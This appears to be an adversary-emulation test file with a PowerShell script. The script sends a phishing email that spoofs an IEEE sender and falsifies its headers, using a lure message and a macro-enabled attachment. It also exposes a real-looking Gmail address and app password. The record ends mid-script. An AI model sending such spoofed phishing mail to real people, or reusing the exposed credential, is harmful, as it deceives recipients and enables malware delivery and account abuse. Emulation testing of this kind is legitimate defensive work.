atomic_tests:
  - name: Simulate sending a phishing email with a malicious attachment via SMTP
    auto_generated_guid: custom-guid-phishing-attachment
    description: |
      This test simulates sending a phishing email with a malicious attachment using PowerShell.
      WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: SMTP server to use
        type: string
        default: "smtp.gmail.com"  # Use Gmail's SMTP server
      smtp_port:
        description: SMTP port
        type: integer
        default: 587  # Standard port for Gmail with TLS
      sender_email:
        description: Real email address for SMTP authentication
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Replace with your Gmail account
      sender_visible_email:
        description: Email address visible in the "From" field
        type: string
        default: '"IEEE Notification" <chaymabouattour@ieee.org>'  # Spoofed email address
      reply_to_email:
        description: Reply-To email address
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Reply-to address
      return_path:
        description: Return-Path email address for spoofing
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Falsified Return-Path
      recipient_email:
        description: Recipient email address
        type: string
        default: "victim2025@outlook.fr"  # Replace with a real email address
      subject:
        description: Customized subject of the email
        type: string
        default: "Urgent: Please review the attached document"
      body:
        description: Customized body content of the email
        type: string
        default: |
          Dear User,<br>
          We have detected unusual activity on your account. To secure your data, please review the attached document as soon as possible.<br>
          Thank you for your cooperation.<br>
          Best regards,<br>
          The Security Team
      attachment_path:
        description: Path to the attachment
        type: string
        default: "C:\\temp\\PhishingAttachment.xlsm"  # Ensure this matches the actual path
      app_password:
        description: Application password for SMTP authentication
        type: string
        default: "wbae yozc iyut rykk"  # Generate an app password for Gmail
      log_file:
        description: Path to the log file
        type: string
        default: "C:\\Users\\chaym\\phishing_script.log"  # Path for logging the result
    executor:
      name: powershell
      elevation_required: false
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = #{smtp_port}
        $senderEmail = "#{sender_email}"  # Real address for authentication
        $senderVisibleEmail = '#{sender_visible_email}'  # Address visible in the "From" field
        $replyToEmail = "#{reply_to_email}"  # Reply-To email address
        $returnPath = "#{return_path}"  # Falsified Return-Path
        $recipientEmail = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachmentPath = "#{attachment_path}"
        $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)

        # Add custom headers for spoofing
        $headers = @{
            "Reply-To" = "$replyToEmail"
            "Return-Path" = "$returnPath"
        }

        Write-Host "üìß Sending email via SMTP..."
        try {
            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
                -From $senderVisibleEmail -To $recipientEmail `
                -Subject $subject -BodyAsHtml $body `
                -Attachments $attachmentPath -Credential $credential `
                -Headers $headers -ErrorAction Stop
            Write-Host "‚úÖ Email sent successfully."
            
            # Log the result
            $logEntry = "Email sent to $recipientEmail successfully at $(Get-Date)"
            Add-Content -Path "#{log_file}" -Value $logEntry
        } catch {
